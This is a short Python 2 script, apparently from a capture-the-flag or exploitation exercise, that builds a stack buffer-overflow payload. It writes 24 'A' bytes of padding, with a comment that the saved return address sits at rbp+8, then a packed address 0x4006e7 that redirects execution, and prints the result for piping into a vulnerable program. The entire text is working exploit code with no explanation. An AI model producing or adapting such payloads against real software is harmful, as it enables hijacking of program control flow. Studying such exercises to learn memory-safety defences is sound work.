#!/usr/bin/env python
from struct import *

buf = "A"*24       # rip = 16+8 = rbp+8
buf += pack("<Q", 0x4006e7)
print buf
